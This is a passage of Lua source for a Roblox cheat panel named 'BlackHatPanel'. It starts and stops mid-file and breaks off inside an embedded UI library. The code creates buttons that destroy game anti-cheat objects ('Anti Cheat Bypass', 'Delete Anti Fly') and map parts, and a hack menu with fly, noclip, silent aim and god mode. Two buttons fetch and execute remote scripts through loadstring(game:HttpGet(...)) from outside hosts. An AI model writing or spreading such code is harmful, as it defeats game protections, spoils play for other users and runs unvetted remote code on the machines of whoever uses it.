Prison_Cellblock.TextSize = 14.000
Prison_Cellblock.TextWrapped = true
Prison_Cellblock.MouseButton1Click:Connect(function()
	Prison_1:Destroy()
end)

UICorner_13.CornerRadius = UDim.new(0, 20)
UICorner_13.Parent = Prison_Cellblock

Prison_Halls.Name = "Prison_Halls"
Prison_Halls.Parent = MapDestroyerLol
Prison_Halls.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Prison_Halls.BorderSizePixel = 0
Prison_Halls.Position = UDim2.new(0.0723888278, 0, 0.308970094, 0)
Prison_Halls.Size = UDim2.new(0, 200, 0, 50)
Prison_Halls.Font = Enum.Font.Gotham
Prison_Halls.Text = "Prison_Halls"
Prison_Halls.TextColor3 = Color3.fromRGB(255, 255, 255)
Prison_Halls.TextScaled = true
Prison_Halls.TextSize = 14.000
Prison_Halls.TextWrapped = true
Prison_Halls.MouseButton1Click:Connect(function()
	Prison_2:Destroy()
end)

UICorner_14.CornerRadius = UDim.new(0, 20)
UICorner_14.Parent = Prison_Halls

Prison_OuterWall.Name = "Prison_OuterWall"
Prison_OuterWall.Parent = MapDestroyerLol
Prison_OuterWall.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Prison_OuterWall.BorderSizePixel = 0
Prison_OuterWall.Position = UDim2.new(0.0723888278, 0, 0.142857149, 0)
Prison_OuterWall.Size = UDim2.new(0, 200, 0, 50)
Prison_OuterWall.Font = Enum.Font.Gotham
Prison_OuterWall.Text = "Prison_OuterWall"
Prison_OuterWall.TextColor3 = Color3.fromRGB(255, 255, 255)
Prison_OuterWall.TextScaled = true
Prison_OuterWall.TextSize = 14.000
Prison_OuterWall.TextWrapped = true
Prison_OuterWall.MouseButton1Click:Connect(function()
	Prison_3:Destroy()
end)

UICorner_15.CornerRadius = UDim.new(0, 20)
UICorner_15.Parent = Prison_OuterWall

Prison_road.Name = "Prison_road"
Prison_road.Parent = MapDestroyerLol
Prison_road.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Prison_road.BorderSizePixel = 0
Prison_road.Position = UDim2.new(0.313340217, 0, 0.142857149, 0)
Prison_road.Size = UDim2.new(0, 200, 0, 50)
Prison_road.Font = Enum.Font.Gotham
Prison_road.Text = "Prison_road"
Prison_road.TextColor3 = Color3.fromRGB(255, 255, 255)
Prison_road.TextScaled = true
Prison_road.TextSize = 14.000
Prison_road.TextWrapped = true
Prison_road.MouseButton1Click:Connect(function()
	Prison_4:Destroy()
end)

UICorner_16.CornerRadius = UDim.new(0, 20)
UICorner_16.Parent = Prison_road

Tower.Name = "Tower"
Tower.Parent = MapDestroyerLol
Tower.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Tower.BorderSizePixel = 0
Tower.Position = UDim2.new(0.374353647, 0, 0.54651165, 0)
Tower.Size = UDim2.new(0, 200, 0, 50)
Tower.Font = Enum.Font.Gotham
Tower.Text = "Tower"
Tower.TextColor3 = Color3.fromRGB(255, 255, 255)
Tower.TextScaled = true
Tower.TextSize = 14.000
Tower.TextWrapped = true
Tower.MouseButton1Click:Connect(function()
	Tower_ez:Destroy()
end)

UICorner_17.CornerRadius = UDim.new(0, 20)
UICorner_17.Parent = Tower

NaturalDisasterSurvivalMaps.Name = "NaturalDisasterSurvivalMaps"
NaturalDisasterSurvivalMaps.Parent = MapDestroyerLol
NaturalDisasterSurvivalMaps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NaturalDisasterSurvivalMaps.BackgroundTransparency = 1.000
NaturalDisasterSurvivalMaps.BorderSizePixel = 0
NaturalDisasterSurvivalMaps.Position = UDim2.new(0.374353677, 0, 0.441860467, 0)
NaturalDisasterSurvivalMaps.Size = UDim2.new(0, 200, 0, 50)
NaturalDisasterSurvivalMaps.Font = Enum.Font.SciFi
NaturalDisasterSurvivalMaps.Text = "Natural Disaster Survival"
NaturalDisasterSurvivalMaps.TextColor3 = Color3.fromRGB(0, 170, 0)
NaturalDisasterSurvivalMaps.TextScaled = true
NaturalDisasterSurvivalMaps.TextSize = 14.000
NaturalDisasterSurvivalMaps.TextWrapped = true

PrisonLifeMaps.Name = "PrisonLifeMaps"
PrisonLifeMaps.Parent = MapDestroyerLol
PrisonLifeMaps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrisonLifeMaps.BackgroundTransparency = 1.000
PrisonLifeMaps.BorderSizePixel = 0
PrisonLifeMaps.Position = UDim2.new(0.374353677, 0, 0, 0)
PrisonLifeMaps.Size = UDim2.new(0, 200, 0, 50)
PrisonLifeMaps.Font = Enum.Font.SciFi
PrisonLifeMaps.Text = "Prison Life"
PrisonLifeMaps.TextColor3 = Color3.fromRGB(255, 85, 0)
PrisonLifeMaps.TextScaled = true
PrisonLifeMaps.TextSize = 14.000
PrisonLifeMaps.TextWrapped = true

BloodAttackMaps.Name = "BloodAttackMaps"
BloodAttackMaps.Parent = MapDestroyerLol
BloodAttackMaps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BloodAttackMaps.BackgroundTransparency = 1.000
BloodAttackMaps.BorderSizePixel = 0
BloodAttackMaps.Position = UDim2.new(0.374353677, 0, 0.734219253, 0)
BloodAttackMaps.Size = UDim2.new(0, 200, 0, 50)
BloodAttackMaps.Font = Enum.Font.SciFi
BloodAttackMaps.Text = "Blood Attack"
BloodAttackMaps.TextColor3 = Color3.fromRGB(255, 0, 0)
BloodAttackMaps.TextScaled = true
BloodAttackMaps.TextSize = 14.000
BloodAttackMaps.TextWrapped = true

AntiCheatBypass.Name = "AntiCheatBypass"
AntiCheatBypass.Parent = MapDestroyerLol
AntiCheatBypass.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
AntiCheatBypass.BorderSizePixel = 0
AntiCheatBypass.Position = UDim2.new(0.374353677, 0, 0.8521595, 0)
AntiCheatBypass.Size = UDim2.new(0, 200, 0, 50)
AntiCheatBypass.Font = Enum.Font.Gotham
AntiCheatBypass.Text = "Anti Cheat Bypass"
AntiCheatBypass.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiCheatBypass.TextScaled = true
AntiCheatBypass.TextSize = 14.000
AntiCheatBypass.TextWrapped = true
AntiCheatBypass.MouseButton1Click:Connect(function()
	AntiCheat:Destroy()
end)

UICorner_18.CornerRadius = UDim.new(0, 20)
UICorner_18.Parent = AntiCheatBypass

MoreAntiCheatBypass.Name = "MoreAntiCheatBypass"
MoreAntiCheatBypass.Parent = MapDestroyerLol
MoreAntiCheatBypass.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
MoreAntiCheatBypass.BorderSizePixel = 0
MoreAntiCheatBypass.Position = UDim2.new(0.634953499, 0, 0.8521595, 0)
MoreAntiCheatBypass.Size = UDim2.new(0, 200, 0, 50)
MoreAntiCheatBypass.Font = Enum.Font.Gotham
MoreAntiCheatBypass.Text = "Anti Cheat Bypass (Delete Anti Fly)"
MoreAntiCheatBypass.TextColor3 = Color3.fromRGB(255, 255, 255)
MoreAntiCheatBypass.TextScaled = true
MoreAntiCheatBypass.TextSize = 14.000
MoreAntiCheatBypass.TextWrapped = true
MoreAntiCheatBypass.MouseButton1Click:Connect(function()
	AntiFly:Destroy()
end)

UICorner_19.CornerRadius = UDim.new(0, 20)
UICorner_19.Parent = MoreAntiCheatBypass

HacksLol.Name = "HacksLol"
HacksLol.Parent = BlackHatPanel
HacksLol.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
HacksLol.BorderSizePixel = 0
HacksLol.Position = UDim2.new(0, 0, 0.0618705042, 0)
HacksLol.Size = UDim2.new(0, 967, 0, 602)
HacksLol.Visible = false

FlyHack.Name = "FlyHack"
FlyHack.Parent = HacksLol
FlyHack.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
FlyHack.BorderSizePixel = 0
FlyHack.Position = UDim2.new(0.0837642625, 0, 0.19568345, 0)
FlyHack.Size = UDim2.new(0, 211, 0, 47)
FlyHack.Font = Enum.Font.Gotham
FlyHack.Text = "Fly"
FlyHack.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyHack.TextScaled = true
FlyHack.TextSize = 14.000
FlyHack.TextWrapped = true

UICorner_20.CornerRadius = UDim.new(0, 20)
UICorner_20.Parent = FlyHack

Reset.Name = "Reset"
Reset.Parent = HacksLol
Reset.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
Reset.BorderSizePixel = 0
Reset.Position = UDim2.new(0.33402279, 0, 0.19568345, 0)
Reset.Size = UDim2.new(0, 211, 0, 47)
Reset.Font = Enum.Font.Gotham
Reset.Text = "Reset"
Reset.TextColor3 = Color3.fromRGB(255, 255, 255)
Reset.TextScaled = true
Reset.TextSize = 14.000
Reset.TextWrapped = true

UICorner_21.CornerRadius = UDim.new(0, 20)
UICorner_21.Parent = Reset

WalkSpeedButton.Name = "WalkSpeedButton"
WalkSpeedButton.Parent = HacksLol
WalkSpeedButton.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
WalkSpeedButton.BorderSizePixel = 0
WalkSpeedButton.Position = UDim2.new(0.596690834, 0, 0.19568345, 0)
WalkSpeedButton.Size = UDim2.new(0, 211, 0, 47)
WalkSpeedButton.Font = Enum.Font.Gotham
WalkSpeedButton.Text = "WalkSpeed"
WalkSpeedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
WalkSpeedButton.TextScaled = true
WalkSpeedButton.TextSize = 14.000
WalkSpeedButton.TextWrapped = true

UICorner_22.CornerRadius = UDim.new(0, 20)
UICorner_22.Parent = WalkSpeedButton

NoclipHack.Name = "NoclipHack"
NoclipHack.Parent = HacksLol
NoclipHack.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
NoclipHack.BorderSizePixel = 0
NoclipHack.Position = UDim2.new(0.0847983882, 0, 0.386713356, 0)
NoclipHack.Size = UDim2.new(0, 211, 0, 47)
NoclipHack.Font = Enum.Font.Gotham
NoclipHack.Text = "Noclip"
NoclipHack.TextColor3 = Color3.fromRGB(255, 255, 255)
NoclipHack.TextScaled = true
NoclipHack.TextSize = 14.000
NoclipHack.TextWrapped = true

UICorner_23.CornerRadius = UDim.new(0, 20)
UICorner_23.Parent = NoclipHack

SilentAimHack.Name = "SilentAimHack"
SilentAimHack.Parent = HacksLol
SilentAimHack.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
SilentAimHack.BorderSizePixel = 0
SilentAimHack.Position = UDim2.new(0.335056931, 0, 0.386713356, 0)
SilentAimHack.Size = UDim2.new(0, 211, 0, 47)
SilentAimHack.Font = Enum.Font.Gotham
SilentAimHack.Text = "Silent Aim"
SilentAimHack.TextColor3 = Color3.fromRGB(255, 255, 255)
SilentAimHack.TextScaled = true
SilentAimHack.TextSize = 14.000
SilentAimHack.TextWrapped = true

UICorner_24.CornerRadius = UDim.new(0, 20)
UICorner_24.Parent = SilentAimHack

God.Name = "God"
God.Parent = HacksLol
God.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
God.BorderSizePixel = 0
God.Position = UDim2.new(0.596690893, 0, 0.386713356, 0)
God.Size = UDim2.new(0, 211, 0, 47)
God.Font = Enum.Font.Gotham
God.Text = "God"
God.TextColor3 = Color3.fromRGB(255, 255, 255)
God.TextScaled = true
God.TextSize = 14.000
God.TextWrapped = true

UICorner_25.CornerRadius = UDim.new(0, 20)
UICorner_25.Parent = God

WalkSpeedBox.Name = "WalkSpeedBox"
WalkSpeedBox.Parent = HacksLol
WalkSpeedBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeedBox.Position = UDim2.new(0.084798336, 0, 0.900332272, 0)
WalkSpeedBox.Size = UDim2.new(0, 200, 0, 50)
WalkSpeedBox.Font = Enum.Font.SourceSansItalic
WalkSpeedBox.PlaceholderText = "Set walkspeed here.."
WalkSpeedBox.Text = ""
WalkSpeedBox.TextColor3 = Color3.fromRGB(255, 255, 255)
WalkSpeedBox.TextSize = 20.000
WalkSpeedBox.TextWrapped = true

UICorner_26.CornerRadius = UDim.new(0, 30)
UICorner_26.Parent = WalkSpeedBox

Normalspeed.Name = "Normalspeed"
Normalspeed.Parent = HacksLol
Normalspeed.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Normalspeed.BorderSizePixel = 0
Normalspeed.Position = UDim2.new(0.601861417, 0, 0.119601302, 0)
Normalspeed.Size = UDim2.new(0, 200, 0, 34)
Normalspeed.Font = Enum.Font.SourceSansItalic
Normalspeed.Text = "Normal walkspeed"
Normalspeed.TextColor3 = Color3.fromRGB(85, 255, 127)
Normalspeed.TextScaled = true
Normalspeed.TextSize = 20.000
Normalspeed.TextWrapped = true

UICorner_27.CornerRadius = UDim.new(0, 20)
UICorner_27.Parent = Normalspeed

CreditsLol.Name = "CreditsLol"
CreditsLol.Parent = BlackHatPanel
CreditsLol.Active = true
CreditsLol.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
CreditsLol.BorderSizePixel = 0
CreditsLol.Position = UDim2.new(0, 0, 0.0618705042, 0)
CreditsLol.Size = UDim2.new(0, 967, 0, 602)
CreditsLol.Visible = false

Owner.Name = "Owner"
Owner.Parent = CreditsLol
Owner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Owner.BackgroundTransparency = 1.000
Owner.BorderSizePixel = 0
Owner.Position = UDim2.new(0.335056871, 0, 0.0287769791, 0)
Owner.Size = UDim2.new(0, 100, 0, 100)
Owner.Image = "rbxassetid://10287033603"

OwnerName.Name = "OwnerName"
OwnerName.Parent = CreditsLol
OwnerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OwnerName.BackgroundTransparency = 1.000
OwnerName.BorderSizePixel = 0
OwnerName.Position = UDim2.new(0.448810756, 0, 0.0467625894, 0)
OwnerName.Size = UDim2.new(0, 200, 0, 50)
OwnerName.Font = Enum.Font.SciFi
OwnerName.Text = "HellAsHell"
OwnerName.TextColor3 = Color3.fromRGB(255, 255, 255)
OwnerName.TextScaled = true
OwnerName.TextSize = 14.000
OwnerName.TextWrapped = true

Rank1.Name = "Rank1"
Rank1.Parent = CreditsLol
Rank1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Rank1.BackgroundTransparency = 1.000
Rank1.BorderSizePixel = 0
Rank1.Position = UDim2.new(0.396070331, 0, 0, 0)
Rank1.Size = UDim2.new(0, 200, 0, 50)
Rank1.Font = Enum.Font.SciFi
Rank1.Text = "Owner"
Rank1.TextColor3 = Color3.fromRGB(255, 255, 255)
Rank1.TextScaled = true
Rank1.TextSize = 14.000
Rank1.TextWrapped = true

UD1.Name = "UD1"
UD1.Parent = CreditsLol
UD1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UD1.BackgroundTransparency = 1.000
UD1.BorderSizePixel = 0
UD1.Position = UDim2.new(0.448810756, 0, 0.183453232, 0)
UD1.Size = UDim2.new(0, 200, 0, 50)
UD1.Font = Enum.Font.SciFi
UD1.Text = "Parkour_Noob"
UD1.TextColor3 = Color3.fromRGB(255, 255, 255)
UD1.TextScaled = true
UD1.TextSize = 14.000
UD1.TextWrapped = true

Rank2.Name = "Rank2"
Rank2.Parent = CreditsLol
Rank2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Rank2.BackgroundTransparency = 1.000
Rank2.BorderSizePixel = 0
Rank2.Position = UDim2.new(0.396070331, 0, 0.109352514, 0)
Rank2.Size = UDim2.new(0, 200, 0, 50)
Rank2.Font = Enum.Font.SciFi
Rank2.Text = "Useless Developers (did nothing)"
Rank2.TextColor3 = Color3.fromRGB(255, 255, 255)
Rank2.TextScaled = true
Rank2.TextSize = 14.000
Rank2.TextWrapped = true

UDPFP1.Name = "UDPFP1"
UDPFP1.Parent = CreditsLol
UDPFP1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
UDPFP1.BorderSizePixel = 0
UDPFP1.Position = UDim2.new(0.345398128, 0, 0.165835708, 0)
UDPFP1.Size = UDim2.new(0, 100, 0, 99)
UDPFP1.Font = Enum.Font.Code
UDPFP1.Text = "?"
UDPFP1.TextColor3 = Color3.fromRGB(255, 255, 255)
UDPFP1.TextScaled = true
UDPFP1.TextSize = 14.000
UDPFP1.TextWrapped = true

UD2.Name = "UD2"
UD2.Parent = CreditsLol
UD2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UD2.BackgroundTransparency = 1.000
UD2.BorderSizePixel = 0
UD2.Position = UDim2.new(0.447776616, 0, 0.289928049, 0)
UD2.Size = UDim2.new(0, 200, 0, 50)
UD2.Font = Enum.Font.SciFi
UD2.Text = "wkiekjjekde (Snowy)"
UD2.TextColor3 = Color3.fromRGB(255, 255, 255)
UD2.TextScaled = true
UD2.TextSize = 14.000
UD2.TextWrapped = true

UDPFP2.Name = "UDPFP2"
UDPFP2.Parent = CreditsLol
UDPFP2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
UDPFP2.BorderSizePixel = 0
UDPFP2.Position = UDim2.new(0.344363987, 0, 0.272310525, 0)
UDPFP2.Size = UDim2.new(0, 100, 0, 99)
UDPFP2.Font = Enum.Font.Code
UDPFP2.Text = "?"
UDPFP2.TextColor3 = Color3.fromRGB(255, 255, 255)
UDPFP2.TextScaled = true
UDPFP2.TextSize = 14.000
UDPFP2.TextWrapped = true

Sorry.Name = "Sorry"
Sorry.Parent = CreditsLol
Sorry.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Sorry.BackgroundTransparency = 1.000
Sorry.BorderSizePixel = 0
Sorry.Position = UDim2.new(0.270941049, 0, 0.354742169, 0)
Sorry.Size = UDim2.new(0, 464, 0, 108)
Sorry.Font = Enum.Font.GothamMedium
Sorry.Text = "We or i finally fixed the black hat panel sorry for being a lazy lol"
Sorry.TextColor3 = Color3.fromRGB(255, 255, 255)
Sorry.TextScaled = true
Sorry.TextSize = 1.000
Sorry.TextWrapped = true

Home2.Name = "Home2"
Home2.Parent = BlackHatPanel
Home2.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
Home2.BorderSizePixel = 0
Home2.Position = UDim2.new(-0.065149948, 0, 0.148201436, 0)
Home2.Size = UDim2.new(0, 967, 0, 542)
Home2.Visible = false
Home2.Active = true
Home2.Draggable = true

Back.Name = "Back"
Back.Parent = Home2
Back.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Back.BackgroundTransparency = 1.000
Back.BorderSizePixel = 0
Back.Position = UDim2.new(0, 0, 0.416961133, 0)
Back.Size = UDim2.new(0, 200, 0, 50)
Back.Font = Enum.Font.GothamBold
Back.Text = "<<"
Back.TextColor3 = Color3.fromRGB(255, 255, 255)
Back.TextScaled = true
Back.TextSize = 14.000
Back.TextWrapped = true

GasStation.Name = "GasStation"
GasStation.Parent = Home2
GasStation.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
GasStation.BorderSizePixel = 0
GasStation.Position = UDim2.new(0.0785936415, 0, 0.126778856, 0)
GasStation.Size = UDim2.new(0, 211, 0, 47)
GasStation.Font = Enum.Font.Gotham
GasStation.Text = "Gas Station"
GasStation.TextColor3 = Color3.fromRGB(255, 255, 255)
GasStation.TextScaled = true
GasStation.TextSize = 14.000
GasStation.TextWrapped = true
GasStation.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://robloxscripts.co.uk/keysystem.lua'))('FptkdRqW')
end)

UICorner_28.CornerRadius = UDim.new(0, 20)
UICorner_28.Parent = GasStation

SoulShatters.Name = "SoulShatters"
SoulShatters.Parent = Home2
SoulShatters.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
SoulShatters.BorderSizePixel = 0
SoulShatters.Position = UDim2.new(0.33402279, 0, 0.126778856, 0)
SoulShatters.Size = UDim2.new(0, 211, 0, 47)
SoulShatters.Font = Enum.Font.Gotham
SoulShatters.Text = "Soul Shatters"
SoulShatters.TextColor3 = Color3.fromRGB(255, 255, 255)
SoulShatters.TextScaled = true
SoulShatters.TextSize = 14.000
SoulShatters.TextWrapped = true
SoulShatters.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("http://hastebin.com/raw/tokinuqovo",true))()
end)

UICorner_29.CornerRadius = UDim.new(0, 20)
UICorner_29.Parent = SoulShatters

DragMe.Name = "DragMe"
DragMe.Parent = Home2
DragMe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DragMe.BackgroundTransparency = 1.000
DragMe.BorderSizePixel = 0
DragMe.Size = UDim2.new(0, 76, 0, 50)
DragMe.Font = Enum.Font.SciFi
DragMe.Text = "Drag Me"
DragMe.TextColor3 = Color3.fromRGB(255, 255, 255)
DragMe.TextSize = 25.000
DragMe.TextWrapped = true

Doors.Name = "Doors"
Doors.Parent = Home2
Doors.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
Doors.BorderSizePixel = 0
Doors.Position = UDim2.new(0.588417828, 0, 0.126778856, 0)
Doors.Size = UDim2.new(0, 211, 0, 47)
Doors.Font = Enum.Font.Gotham
Doors.Text = "Doors"
Doors.TextColor3 = Color3.fromRGB(255, 255, 255)
Doors.TextScaled = true
Doors.TextSize = 14.000
Doors.TextWrapped = true
Doors.MouseButton1Click:Connect(function()
	--[[
	ui-engine-v2
	version 1.3a
	by Singularity (V3rm @ King Singularity) (Discord @ Singularity#5490)
--]]

	local ui_options = {
		main_color = Color3.fromRGB(41, 74, 122),
		min_size = Vector2.new(400, 300),
		toggle_key = Enum.KeyCode.RightShift,
		can_resize = true,
	}

	do
		local imgui = game:GetService("CoreGui"):FindFirstChild("imgui")
		if imgui then imgui:Destroy() end
	end

	local imgui = Instance.new("ScreenGui")
	local Prefabs = Instance.new("Frame")
	local Label = Instance.new("TextLabel")
	local Window = Instance.new("ImageLabel")
	local Resizer = Instance.new("Frame")
	local Bar = Instance.new("Frame")
	local Toggle = Instance.new("ImageButton")
	local Base = Instance.new("ImageLabel")
	local Top = Instance.new("ImageLabel")
	local Tabs = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local TabSelection = Instance.new("ImageLabel")
	local TabButtons = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local Frame = Instance.new("Frame")
	local Tab = Instance.new("Frame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local TextBox = Instance.new("TextBox")
	local TextBox_Roundify_4px = Instance.new("ImageLabel")
	local Slider = Instance.new("ImageLabel")
	local Title_2 = Instance.new("TextLabel")
	local Indicator = Instance.new("ImageLabel")
	local Value = Instance.new("TextLabel")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local Circle = Instance.new("ImageLabel")
	local UIListLayout_3 = Instance.new("UIListLayout")
	local Dropdown = Instance.new("TextButton")
	local Indicator_2 = Instance.new("ImageLabel")
	local Box = Instance.new("ImageButton")
	local Objects = Instance.new("ScrollingFrame")
	local UIListLayout_4 = Instance.new("UIListLayout")
	local TextButton_Roundify_4px = Instance.new("ImageLabel")
	local TabButton = Instance.new("TextButton")
	local TextButton_Roundify_4px_2 = Instance.new("ImageLabel")
	local Folder = Instance.new("ImageLabel")
	local Button = Instance.new("TextButton")
	local TextButton_Roundify_4px_3 = Instance.new("ImageLabel")
	local Toggle_2 = Instance.new("ImageLabel")
	local Objects_2 = Instance.new("Frame")
	local UIListLayout_5 = Instance.new("UIListLayout")
	local HorizontalAlignment = Instance.new("Frame")
	local UIListLayout_6 = Instance.new("UIListLayout")
	local Console = Instance.new("ImageLabel")
	local ScrollingFrame = Instance.new("ScrollingFrame")
	local Source = Instance.new("TextBox")
	local Comments = Instance.new("TextLabel")
	local Globals = Instance.new("TextLabel")
	local Keywords = Instance.new("TextLabel")
	local RemoteHighlight = Instance.new("TextLabel")
	local Strings = Instance.new("TextLabel")
	local Tokens = Instance.new("TextLabel")
	local Numbers = Instance.new("TextLabel")
	local Info = Instance.new("TextLabel")
	local Lines = Instance.new("TextLabel")
	local ColorPicker = Instance.new("ImageLabel")
	local Palette = Instance.new("ImageLabel")
	local Indicator_3 = Instance.new("ImageLabel")
	local Sample = Instance.new("ImageLabel")
	local Saturation = Instance.new("ImageLabel")
	local Indicator_4 = Instance.new("Frame")
	local Switch = Instance.new("TextButton")
	local TextButton_Roundify_4px_4 = Instance.new("ImageLabel")
	local Title_3 = Instance.new("TextLabel")
	local Button_2 = Instance.new("TextButton")
	local TextButton_Roundify_4px_5 = Instance.new("ImageLabel")
	local DropdownButton = Instance.new("TextButton")
	local Keybind = Instance.new("ImageLabel")
	local Title_4 = Instance.new("TextLabel")
	local Input = Instance.new("TextButton")
	local Input_Roundify_4px = Instance.new("ImageLabel")
	local Windows = Instance.new("Frame")

	imgui.Name = "imgui"
	imgui.Parent = game:GetService("CoreGui")

	Prefabs.Name = "Prefabs"
	Prefabs.Parent = imgui
	Prefabs.BackgroundColor3 = Color3.new(1, 1, 1)
	Prefabs.Size = UDim2.new(0, 100, 0, 100)
	Prefabs.Visible = false

	Label.Name = "Label"
	Label.Parent = Prefabs
	Label.BackgroundColor3 = Color3.new(1, 1, 1)
	Label.BackgroundTransparency = 1
	Label.Size = UDim2.new(0, 200, 0, 20)
	Label.Font = Enum.Font.GothamSemibold
	Label.Text = "Hello, world 123"
	Label.TextColor3 = Color3.new(1, 1, 1)
	Label.TextSize = 14
	Label.TextXAlignment = Enum.TextXAlignment.Left

	Window.Name = "Window"
	Window.Parent = Prefabs
	Window.Active = true
	Window.BackgroundColor3 = Color3.new(1, 1, 1)
	Window.BackgroundTransparency = 1
	Window.ClipsDescendants = true
	Window.Position = UDim2.new(0, 20, 0, 20)
	Window.Selectable = true
	Window.Size = UDim2.new(0, 200, 0, 200)
	Window.Image = "rbxassetid://2851926732"
	Window.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
	Window.ScaleType = Enum.ScaleType.Slice
	Window.SliceCenter = Rect.new(12, 12, 12, 12)

	Resizer.Name = "Resizer"
	Resizer.Parent = Window
	Resizer.Active = true
	Resizer.BackgroundColor3 = Color3.new(1, 1, 1)
	Resizer.BackgroundTransparency = 1
	Resizer.BorderSizePixel = 0
	Resizer.Position = UDim2.new(1, -20, 1, -20)
	Resizer.Size = UDim2.new(0, 20, 0, 20)

	Bar.Name = "Bar"
	Bar.Parent = Window
	Bar.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Bar.BorderSizePixel = 0
	Bar.Position = UDim2.new(0, 0, 0, 5)
	Bar.Size = UDim2.new(1, 0, 0, 15)

	Toggle.Name = "Toggle"
	Toggle.Parent = Bar
	Toggle.BackgroundColor3 = Color3.new(1, 1, 1)
	Toggle.BackgroundTransparency = 1
	Toggle.Position = UDim2.new(0, 5, 0, -2)
	Toggle.Rotation = 90
	Toggle.Size = UDim2.new(0, 20, 0, 20)
	Toggle.ZIndex = 2
	Toggle.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"

	Base.Name = "Base"
	Base.Parent = Bar
	Base.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Base.BorderSizePixel = 0
	Base.Position = UDim2.new(0, 0, 0.800000012, 0)
	Base.Size = UDim2.new(1, 0, 0, 10)
	Base.Image = "rbxassetid://2851926732"
	Base.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Base.ScaleType = Enum.ScaleType.Slice
	Base.SliceCenter = Rect.new(12, 12, 12, 12)

	Top.Name = "Top"
	Top.Parent = Bar
	Top.BackgroundColor3 = Color3.new(1, 1, 1)
	Top.BackgroundTransparency = 1
	Top.Position = UDim2.new(0, 0, 0, -5)
	Top.Size = UDim2.new(1, 0, 0, 10)
	Top.Image = "rbxassetid://2851926732"
	Top.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
	Top.ScaleType = Enum.ScaleType.Slice
	Top.SliceCenter = Rect.new(12, 12, 12, 12)

	Tabs.Name = "Tabs"
	Tabs.Parent = Window
	Tabs.BackgroundColor3 = Color3.new(1, 1, 1)
	Tabs.BackgroundTransparency = 1
	Tabs.Position = UDim2.new(0, 15, 0, 60)
	Tabs.Size = UDim2.new(1, -30, 1, -60)

	Title.Name = "Title"
	Title.Parent = Window
	Title.BackgroundColor3 = Color3.new(1, 1, 1)
	Title.BackgroundTransparency = 1
	Title.Position = UDim2.new(0, 30, 0, 3)
	Title.Size = UDim2.new(0, 200, 0, 20)
	Title.Font = Enum.Font.GothamBold
	Title.Text = "Gamer Time"
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.TextSize = 14
	Title.TextXAlignment = Enum.TextXAlignment.Left

	TabSelection.Name = "TabSelection"
	TabSelection.Parent = Window
	TabSelection.BackgroundColor3 = Color3.new(1, 1, 1)
	TabSelection.BackgroundTransparency = 1
	TabSelection.Position = UDim2.new(0, 15, 0, 30)
	TabSelection.Size = UDim2.new(1, -30, 0, 25)
	TabSelection.Visible = false
	TabSelection.Image = "rbxassetid://2851929490"
	TabSelection.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
	TabSelection.ScaleType = Enum.ScaleType.Slice
	TabSelection.SliceCenter = Rect.new(4, 4, 4, 4)

	TabButtons.Name = "TabButtons"
	TabButtons.Parent = TabSelection
	TabButtons.BackgroundColor3 = Color3.new(1, 1, 1)
	TabButtons.BackgroundTransparency = 1
	TabButtons.Size = UDim2.new(1, 0, 1, 0)

	UIListLayout.Parent = TabButtons
	UIListLayout.FillDirection = Enum.FillDirection.Horizontal
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 2)

	Frame.Parent = TabSelection
	Frame.BackgroundColor3 = Color3.new(0.12549, 0.227451, 0.372549)
	Frame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, 1, 0)
	Frame.Size = UDim2.new(1, 0, 0, 2)

	Tab.Name = "Tab"
	Tab.Parent = Prefabs
	Tab.BackgroundColor3 = Color3.new(1, 1, 1)
	Tab.BackgroundTransparency = 1
